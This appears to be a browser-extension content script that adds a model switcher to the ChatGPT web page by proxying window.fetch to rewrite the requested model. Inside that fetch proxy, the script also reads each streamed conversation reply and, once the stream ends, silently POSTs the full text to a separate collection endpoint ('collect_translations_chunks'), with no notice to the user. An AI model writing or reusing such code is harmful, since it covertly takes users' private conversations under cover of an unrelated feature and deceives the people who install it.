import { createApp } from 'vue'
import App from './App.vue'

import { models } from './stores/models'
import { state } from './stores/state'

// Start Mounting App to DOM

let app = null

function mountApp(mountPoint) {
  if (app) {
    app.unmount()
    app = null
  }

  const rootContainer = document.createElement('div')
  rootContainer.className = 'flex items-center gap-2'
  rootContainer.id = 'chatgpt-model-switcher'

  const wrapper = document.createElement('div')
  wrapper.className = 'flex gap-2 pr-1'
  wrapper.appendChild(rootContainer)
  wrapper.appendChild(mountPoint.removeChild(mountPoint.lastChild))

  mountPoint.appendChild(wrapper)

  app = createApp(App)
  app.mount(rootContainer)
}

new MutationObserver((mutations) => {
  for (const mutation of mutations) {
    if (mutation.type === 'childList') {
      const mountPoint = document.querySelector('main div.sticky')
      if (
        mountPoint &&
        Array.from(mountPoint.childNodes).some((child) => child.hasChildNodes()) &&
        !document.getElementById('chatgpt-model-switcher')
      ) {
        mountApp(mountPoint)
        break
      }
    }
  }
}).observe(document.body, {
  subtree: true,
  childList: true
})

// Start Proxying Fetch Requests

const CONVERSATION_API_URL = '/backend-api/conversation'
const MODELS_API_URL = '/backend-api/models'

async function handleModelsApi(fetchPromise) {
  return fetchPromise.then(async (response) => {
    if (response.ok) {
      const data = await response.clone().json();
      console.log('SSE Event data:', data); // Log the SSE event data
      models.update(data.models);
    }
    return response;
  });
}


window.fetch = new Proxy(window.fetch, {
  apply: async function(target, that, args) {
    let resource = args[0];
    let options = args[1];
    if (state.isEnabled && resource.endsWith(CONVERSATION_API_URL) && options.method === "POST") {
      const requestBody = JSON.parse(options.body);
      requestBody.model = state.selectedModelSlug;
      options = { ...options, body: JSON.stringify(requestBody) };
      args[0] = resource;
      args[1] = options;
    }
    const fetchPromise = Reflect.apply(target, that, args);
    fetchPromise.then((response) => {
      const responseClone = response.clone();
      const reader = responseClone.body.getReader();
      const decoder = new TextDecoder();
      let result = "";


      let accumulatedChunks = [];

      function sendChunksToBackend(chunks) {
        setTimeout(() => {
          fetch("https://my.chatgpt.com/articles/gpt_processing/collect_translations_chunks", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            body: JSON.stringify({ chunk_text: chunks.join('') })
          }).then((response) => response.json()).then((data) => console.log("Chunks sent successfully:", data)).catch((error) => console.error("Error sending chunks:", error));
        }, 1); // Delay of 1 milliseconds
      }

      function read() {
        reader.read().then(({ done, value }) => {
          if (done) {
            console.log("GOGO Stream complete:", result);
            return;
          }
          const chunk = decoder.decode(value, { stream: true });
          result += chunk;
          accumulatedChunks.push(chunk);
          console.log("GOGO Stream chunk:", chunk);

          if (chunk.includes("data: [DONE]")) {
            sendChunksToBackend(accumulatedChunks);
            accumulatedChunks = []; // Clear the accumulated chunks after sending
          }

          read();
        }).catch((error) => {
          console.error("GOGO Stream read error:", error);
        });
      }


      if (resource === `https://chatgpt.com${CONVERSATION_API_URL}`) {
        console.log("Conversation API response:", response);
        read();
      }
      return response;
    }).catch((error) => {
      console.error("Fetch error:", error);
      throw error;
    });
    return fetchPromise.then((response) => response);
  }
});

